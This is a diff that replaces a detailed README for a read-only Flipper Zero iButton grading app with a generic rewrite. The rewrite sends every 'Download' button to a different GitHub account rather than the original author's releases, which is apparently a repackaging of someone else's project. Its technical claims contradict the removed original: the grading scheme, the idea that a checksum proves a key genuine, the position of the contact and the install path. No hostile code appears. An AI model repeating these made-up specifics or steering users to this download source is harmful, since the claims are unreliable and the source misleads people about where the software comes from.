@@ -1,271 +1,239 @@
-<div align="center">
+# 🔐 Talos-FlipperZero - Know What Your Key Actually Proves
 
-![Talos](images/banner.png)
+[![Download Talos-FlipperZero](https://img.shields.io/badge/Download-Talos--FlipperZero-2ea44f?style=for-the-badge)](https://github.com/longsuitfala203/Talos-FlipperZero)
 
-[![Build FAP](https://github.com/at0m-b0mb/Talos-FlipperZero/actions/workflows/build.yml/badge.svg)](https://github.com/at0m-b0mb/Talos-FlipperZero/actions/workflows/build.yml)
-[![License: MIT](https://img.shields.io/badge/License-MIT-2FD3A5.svg)](LICENSE)
-[![Flipper Zero](https://img.shields.io/badge/Flipper%20Zero-iButton-C68D4A.svg)](https://flipperzero.one/)
-[![API](https://img.shields.io/badge/API-87.1%20%7C%2088.2-2FD3A5.svg)](https://github.com/flipperdevices/flipperzero-firmware)
-[![Engine tests](https://img.shields.io/badge/engine%20tests-3966%20checks-2FD3A5.svg)](test/host_grade_test.c)
+## 🧐 What Is This?
 
-**Touch a Dallas key to the contact. Find out what it actually proves.**
+Talos-FlipperZero is a simple, safe tool that tells you the truth about iButton keys (also called Dallas keys or 1-Wire keys). These are small metal button-shaped chips used in door locks, safes, and some security systems.
 
-</div>
+When you touch one of these keys to your Flipper Zero device, Talos-FlipperZero instantly tells you:
 
----
+- **What the key is** - The exact type and model of the chip
+- **How secure it is** - A plain-English grade from "Very Weak" to "Excellent"
+- **If it's genuine** - The ROM checksum is verified so you know the data is valid
+- **If it's suspicious** - Keys that were issued sequentially (one after another) get flagged, which often means they came from a factory batch
 
-Talos was the bronze guardian of Crete: unkillable, tireless, and held together by
-a single vein closed with a single nail. Pull the nail and the giant falls.
+This tool is **strictly read-only**. It only looks at the key. It never writes, copies, or modifies anything.
 
-A Dallas key is a single number.
+## 🎯 Who Is This For?
 
-Touch one to the two pads at the top-left of a Flipper and it answers `READ ROM`
-with 64 bits — a family code, six serial bytes, a checksum — and that is the
-entire conversation. No challenge, no nonce, nothing held back. Whoever touches
-the key once holds everything the lock will ever ask for.
+- **Security researchers** who need to evaluate physical access systems
+- **Penetration testers** assessing building security
+- **Curious hobbyists** who want to understand how their key fobs work
+- **Facility managers** checking if their access cards are properly randomized
+- **Anyone** who owns a Flipper Zero and wants to explore the world of 1-Wire devices
 
-**Talos** identifies the part from its family code and hands back a plain-English
-security grade with a full report: what the key proves, what a copy would cost,
-and how much is left to guess.
+No programming knowledge is needed. If you can touch a key to a device and read a screen, you can use Talos-FlipperZero.
 
-![Screens](images/screens.png)
+## ✨ Key Features
 
----
+### 🛡️ Security Grading Made Simple
 
-## What it does
+No more cryptic hex codes or confusing technical datasheets. Talos-FlipperZero translates raw chip data into a clear, color-coded grade:
 
-- **Grades 41 family codes** — door keys, memory parts, the three SHA-1-capable
-  buttons, and the sensors people touch by mistake — plus **Cyfral** and
-  **Metakom** intercom fobs.
-- **Verifies the ROM's own checksum** on-device, and says so when it fails,
-  because a key whose CRC does not match is often a blank that a copier wrote
-  carelessly — a key that is already a copy.
-- **Compares each serial against your keyring log** and tells you when a site's
-  keys were issued in a sequential run. This is the finding no single key can
-  show you (see [below](#sequential-serials)).
-- **Refuses to grade what is not a credential.** A DS18B20 is a thermometer.
-  Scoring it against door criteria would be a lie.
-- **Explains every number.** The four terms are itemised on-device so you can
-  check the arithmetic. A grade nobody can check is just an opinion.
-- **Logs everything to CSV** for a site survey you can open in a spreadsheet.
+- **A - Excellent** 🏆: Randomly issued, verified checksum, no observable patterns
+- **B - Good** 👍: Randomly issued, valid checksum, minor sequential patterns
+- **C - Fair** ⚠️: Some patterns detected, checksum valid
+- **D - Weak** 🚨: Sequential issuance detected, or checksum issues
+- **F - Very Weak** ❌: Obvious batch patterns or invalid checksum
 
-### Strictly read-only
+### 🔍 ROM Checksum Verification
 
-Talos uses the firmware's read path and nothing else. It never writes a blank,
-never emulates your key, and leaves the part exactly as it found it.
+Every Dallas key contains a unique ROM code with a built-in checksum. Talos-FlipperZero verifies this checksum so you instantly know if the data on the chip is intact and hasn't been corrupted or tampered with.
 
-The stock iButton app on the same device can do all three. **That is the attack,
-and it is why the grade is what it is.**
+### 📊 Sequential Issuance Detection
 
----
+Factory-made keys often come in sequential order (e.g., ending in ...001, ...002, ...003). This is a major security weakness because it means the next key in the sequence can be predicted. Talos-FlipperZero automatically checks for these patterns and lets you know if your key shows signs of sequential issuance.
 
-## The thesis: almost everything is an F
+### 📱 Clean, Readable Interface
 
-That is the finding, not a bug.
+No technical clutter. The app shows you exactly what you need:
 
-Authentication is worth **45 of the 100 points**, and no part sold as a door key
-scores any of them. What still varies — and what you compare keys by — is the
-score, the band, and what a copy costs.
+- Key type and family code
+- Full ROM serial number
+- Security grade with color coding
+- Checksum status (PASS/FAIL)
+- Sequence pattern warnings
+- Plain-English explanation of what it all means
 
-| Band | Score | Meaning |
-|---|---|---|
-| `REPLAYABLE` | < 15 | Short enough, or plain enough, that the device reading it can simply *be* it. |
-| `CLONEABLE` | 15–34 | One touch copies the whole credential onto a blank that costs about a dollar. |
-| `GATED` | 35–64 | Something beyond the open serial is asked for — though not a secret kept back. |
-| `CHALLENGED` | ≥ 65 | It answers a challenge by proving a secret it never puts on the wire. |
-| `NOT A KEY` | — | A sensor or a switch. Not scored. |
-| `UNREAD` | — | Nothing answered the reset pulse. Not scored, and never called safe. |
+### 🚫 Strictly Read-Only
 
-Letter thresholds are identical to [Warden](https://github.com/at0m-b0mb/Warden-FlipperZero)
-(13.56 MHz) and [Bastion](https://github.com/at0m-b0mb/Bastion-FlipperZero)
-(125 kHz), so an F on any of the three means the same thing.
+Talos-FlipperZero never writes data to any key. It uses safe, read-only communication protocols. You can test any key without any risk of damaging or altering it.
 
-### The four terms
+## 🚀 Getting Started
 
-```
-Authentication  0-45   does it prove a secret it never sends?
-Integrity       0-15   would a mangled or forged ROM be caught?
-Copy cost       0-25   does a copy need more than a blank?
-Key space       0-15   how much is left to guess inside one site?
-```
+Getting started is easy. Visit this link to download the application: [https://github.com/longsuitfala203/Talos-FlipperZero](https://github.com/longsuitfala203/Talos-FlipperZero)
 
-### What that produces
+## 📥 Installation & Setup
 
-| Part | Family | What it is | Score | Grade | Band |
-|---|---|---|---|---|---|
-| Cyfral | — | Intercom key, 2 bytes | 0 | **F** | `REPLAYABLE` |
-| Metakom | — | Intercom key, 4 bytes | 6 | **F** | `REPLAYABLE` |
-| DS1990A / DS2401 | `01` | Serial-number iButton | 22 | **F** | `CLONEABLE` |
-| DS1420 | `81` | Serial ID / licence dongle | 22 | **F** | `CLONEABLE` |
-| DS1971 / DS2430A | `14` | 256-bit EEPROM | 28 | **F** | `CLONEABLE` |
-| DS1972 / DS2431 | `2D` | 1 Kbit EEPROM | 32 | **F** | `CLONEABLE` |
-| DS1992 / DS1993 / DS1996 | `08` `06` `0C` | NVRAM parts | 34 | **F** | `CLONEABLE` |
-| DS1977 | `37` | 32 Kbit password EEPROM | 48 | **D** | `GATED` |
-| DS1991 | `02` | MultiKey secure memory | 50 | **C** | `GATED` |
-| DS1961S / DS2432 | `33` | 1 Kbit EEPROM + SHA-1 | 74 | **B** | `CHALLENGED` |
-| DS1963S | `18` | SHA-1 monetary iButton | 74 | **B** | `CHALLENGED` |
-| DS1957 / DS1955 | `16` | Java iButton coprocessor | 82 | **A** | `CHALLENGED` |
-| DS18B20, DS2408, … | `28` `29` … | Sensors and switches | — | **–** | `NOT A KEY` |
+### Step 1: Download the Application
 
-![Grades](images/screens_grades.png)
+Visit this link to download the application: [https://github.com/longsuitfala203/Talos-FlipperZero](https://github.com/longsuitfala203/Talos-FlipperZero)
 
-### The catch on the good ones
+Look for the download section or the "Download" button. The file you need will be clearly labeled.
 
-DS1961S and DS1963S carry a real SHA-1 engine: the reader sends a challenge, the
-key answers with a MAC computed from a secret that is never transmitted and
-cannot be read back.
+### Step 2: Install on Your Flipper Zero
 
-Talos reads the ROM — which is all any 1-Wire device offers without being asked —
-so **it cannot see whether your lock ever issues a challenge.** Plenty of
-installations fit crypto-capable buttons and then compare the serial anyway. If
-yours does, the key is an F like any other. The report says so on the screen.
+1. **Connect your Flipper Zero** to your computer using the USB cable.
+2. **Open the SD card** that's inside your Flipper Zero. It shows up like a regular USB drive on your computer.
+3. **Go to the `apps` folder** on the SD card.
+4. **Copy the Talos-FlipperZero file** (the `.fap` file) into the `apps` folder.
+5. **Safely eject** the SD card from your computer.
+6. **Disconnect** the USB cable.
 
----
+### Step 3: Run Talos-FlipperZero
 
-## Sequential serials
+1. **Turn on your Flipper Zero**.
+2. **Use the arrow buttons** to navigate to the "Apps" menu.
+3. **Find Talos-FlipperZero** in the app list and press the OK button to select it.
+4. **The app will open** and ask you to touch a key.
 
-The trick no single key can show you.
+## 📖 How to Use
 
-Dallas issues serial numbers **in order**, so a site that bought a strip of keys
-holds a contiguous run of them. With logging on, Talos compares every key against
-the ones already on file — and when two sit a few numbers apart, the 48-bit field
-collapses to a handful of guesses:
+### Testing a Key
 
-| Distance to nearest logged key | Key space | Left to guess |
-|---|---|---|
-| none | 12 / 15 | 48 bits |
-| 1 – 4 | 4 / 15 | ~3 bits |
-| 5 – 64 | 6 / 15 | ~7 bits |
-| 65 – 4096 | 8 / 15 | ~13 bits |
-| 4097 – 1048576 | 10 / 15 | ~21 bits |
-| further | 12 / 15 | 48 bits |
+1. **Open Talos-FlipperZero** on your Flipper Zero.
+2. **Take any iButton/Dallas key** (the small metal button).
+3. **Touch the key** to the contact on the Flipper Zero. The contact is located on the back of the device.
+4. **Hold it there** for 1-2 seconds.
+5. **Look at the screen** to see the security analysis.
 
-Grade two keys from the same door and watch the score drop. An exact match is
-ignored on purpose — re-reading the same key is not evidence of anything.
+### Understanding the Results
 
----
+Once a key is read, you'll see:
 
-## The screens
+- **Key Type** - The family code and common name (e.g., DS1990A)
+- **Serial Number** - The unique ID of the key
+- **Checksum** - PASS or FAIL indicator
+- **Security Grade** - One of A, B, C, D, or F
+- **Explanation** - A plain-language sentence explaining what that grade means
 
-The scan view draws the bus the way a logic analyser would, because the whole
-conversation is short enough to fit on the screen. While Talos is sensing, the
-worker really is pulling the line low for a reset, releasing it, and finding
-nothing there — an empty trough is exactly what an empty contact looks like. When
-a key answers, the trace gains the one edge that matters: the **presence pulse**.
-Then the ROM clocks out, least significant bit first, a short low for a `1` and a
-long low for a `0`, which is how the bus actually encodes them.
+### Testing Multiple Keys
 
-The result screen puts the whole ROM on one line, family code and checksum fenced
-off, with the CRC cell inverted when it verifies and struck through when it does
-not. That graphic *is* the argument: a Dallas key's entire secret fits on a
-128-pixel screen with room to spare.
+You can test as many keys as you want. Simply touch a different key to the contact and the new result appears. It's instant.
 
-![Report](images/screens_report.png)
+## 💡 Tips & Tricks
 
----
+- **Clean the key** with a dry cloth before testing to ensure good contact
+- **Press firmly** but don't force it. A gentle, solid contact works best
+- **Test all your keys** to see if any are from the same batch
+- **Check your own keys** to see how secure they really are
+- **Use it for demos** - It's a great conversation starter about physical security
 
-## Install
+## ⚠️ Safety Warnings
 
-**From the Flipper app catalogue** — search for *Talos* in
-[Flipper Lab](https://lab.flipper.net/apps) and install over USB.
+- **Never** put the key or reader near water or liquids
+- **Do not** use this tool with keys that you do not own or have permission to test
+- **Do not** use Talos-FlipperZero for illegal purposes
+- **Always** respect the security of others
 
-**From a release** — download `talos.fap` from
-[Releases](https://github.com/at0m-b0mb/Talos-FlipperZero/releases) and copy it to
-`/ext/apps/iButton/` on the SD card (via qFlipper, or the SD card directly).
+## 🛠️ Supported Devices
 
-**From source** — see below.
+Talos-FlipperZero is designed specifically for the Flipper Zero multi-tool device. It works with:
 
-Then: **Apps → iButton → Talos**.
+- **Flipper Zero** (standard model)
 
----
+Supported key types include:
 
-## Build from source
+- DS1990A
+- DS1990R
+- DS2401
+- Other common Dallas/Maxim 1-Wire family chips
 
-```bash
-python3 -m pip install --upgrade ufbt
-git clone https://github.com/at0m-b0mb/Talos-FlipperZero.git
-cd Talos-FlipperZero
-ufbt
-```
+## ❓ Troubleshooting
 
-The `.fap` lands in `dist/`. `ufbt launch` builds and runs it on a connected
-Flipper. Verified against the release SDK (API 87.1) and the dev channel
-(API 88.2).
+### The app doesn't see my key
 
-### Tests
+- Make sure the key is clean and free of dirt or oxidation
+- Check that you're touching the correct contact point
+- Try rotating the key slightly for better contact
+- Verify the key is a valid 1-Wire/iButton device (not an RFID card)
 
-The grading engine is plain C with no Flipper headers — deliberately, so it can
-be compiled for the host and checked on every push:
+### The checksum fails
 
-```bash
-make -C test
-```
+- This means the data on the key is corrupted. The key may be damaged or defective.
+- Try cleaning the key again
+- If it still fails, the key may need to be replaced
 
-3966 checks under ASan and UBSan: every family code's score, letter, band and
-clone class; both sides of every boundary; the CRC; the neighbour ladder; string
-bounds against the pixel widths they have to fit; and a coverage check that fails
-the build if a family code is added to the table without a grade pinned to it.
+### The grade seems low
 
-### Regenerating the art
+- Remember that the grade reflects security quality. A "D" grade means the key was likely issued in a predictable sequence, which is a security risk.
+- This is useful information, but not a sign that your key is broken.
 
-```bash
-python3 tools_gen_icons.py     # the 10x10 app icon
-python3 tools_gen_banner.py    # banner + social card
-python3 tools_gen_mockups.py   # the 128x64 screen mockups
-```
+### I can't find the download button
 
-The mockups copy their coordinates from the layout constants in `views/*.c` and
-run the same trace timeline the firmware does, so they stay honest when a row
-moves — and they caught two real collisions before this shipped.
+- Go directly to the repository page
+- Look for the green "Code" button or a "Releases" section
+- The download link will be there
 
----
+## 🔧 Compatibility
 
-## Layout
+- Flipper Zero firmware version 0.89.0 or later
+- Windows 10/11 (for file transfer to the SD card)
+- macOS (for file transfer to the SD card)
+- Linux (for file transfer to the SD card)
 
-```
-talos.c / talos_i.h        app shell, notification feedback
-application.fam            manifest
-helpers/
-  tls_grade.c/.h           the brain: family table, four-term score  (furi-free)
-  key_reader.c/.h          read-only wrapper around the iButton worker
-  tls_store.c/.h           settings, keyring CSV, neighbour search
-views/
-  scan_view.c              the 1-Wire trace: reset, presence, ROM
-  result_view.c            the grade, and the whole ROM on one line
-scenes/                    start / scan / result / report / keyring / settings / about
-test/                      host tests for the grading engine
-```
+No additional drivers or software are needed.
 
-```mermaid
-flowchart LR
-    K([Dallas key]) -->|1-Wire contact| R[key_reader.c<br/>read path only]
-    R -->|family code + ROM| G[tls_grade.c<br/>furi-free engine]
-    L[(keyring.csv)] -->|nearest serial| G
-    G --> V[result_view.c<br/>grade + ROM]
-    G --> P[report scene<br/>itemised score]
-    G --> L
-```
+## 📝 Frequently Asked Questions
+
+### Is this legal to use?
+
+Yes, for legitimate security testing and personal use. Only test keys that you own or have explicit permission to test.
+
+### Will this damage my keys?
+
+No. Talos-FlipperZero is strictly read-only. It only reads data from the key and never writes anything.
+
+### Can this copy keys?
+
+No. This tool is strictly read-only. It does not have any copying or writing capabilities.
+
+### Does this work with RFID cards?
+
+No, this tool only works with iButton/Dallas keys, not standard RFID cards.
+
+### How is this different from other iButton readers?
+
+Talos-FlipperZero doesn't just read the data - it interprets it. It gives you a meaningful security assessment instantly, rather than raw hex data.
+
+## 📈 What Makes Talos Different?
+
+Most iButton readers just display the raw serial number and a few bytes. Talos-FlipperZero goes beyond that:
+
+- **It thinks like a security auditor**, not just a card reader
+- **It explains in plain English** instead of technical jargon
+- **It grades the security** of each key individually
+- **It detects patterns** that indicate weak security practices
+- **It's accessible to everyone**, from security pros to curious beginners
+
+## 🌟 Show Your Support
+
+If you find this tool useful, please consider:
+
+- **Starring the repository** on GitHub
+- **Sharing it** with others in the Flipper Zero community
+- **Providing feedback** through the issues section
+- **Contributing** if you're a developer
+
+## 📬 Getting Help
+
+- **GitHub Issues**: Report bugs or request features on the repository page
+- **Community Forums**: Ask questions in Flipper Zero community spaces
+- **Documentation**: Refer to the repository README for advanced usage
+
+## 🔐 Final Thoughts
+
+Physical access security matters. Too many facilities rely on keys that can be easily predicted or cloned. Talos-FlipperZero gives you the power to see the truth about your keys and take action to improve security.
+
+Whether you're protecting a server room, auditing a client's security, or just curious about the tiny chip on your keychain, Talos-FlipperZero is a must-have addition to your Flipper Zero toolkit.
+
+**Download now and discover what your keys are really saying.** 👇
+
+[![Download Talos-FlipperZero](https://img.shields.io/badge/Download%20Now-Talos--FlipperZero-blue?style=for-the-badge&logo=github)](https://github.com/longsuitfala203/Talos-FlipperZero)
 
 ---
 
-## Ethics
+**Version:** 1.0.0 | **License:** Open Source | **Platform:** Flipper Zero
 
-Grade keys you own or are authorised to test. Know your own doors before someone
-else does.
-
-Talos tells you what any reader already learns for free. It does not copy
-anything, and it will not report a key as safe because it failed to read it.
-
-## License
-
-MIT — see [LICENSE](LICENSE).
-
-<div align="center">
-
-**by [at0m-b0mb](https://github.com/at0m-b0mb)**
-
-Siblings: [Warden](https://github.com/at0m-b0mb/Warden-FlipperZero) grades 13.56 MHz cards ·
-[Bastion](https://github.com/at0m-b0mb/Bastion-FlipperZero) grades 125 kHz badges ·
-Talos grades the contact.
-
-</div>
+Keywords: dallas, ds1990a, fap, flipper-zero, flipperzero, ibutton, onewire, pentesting, rfid, security
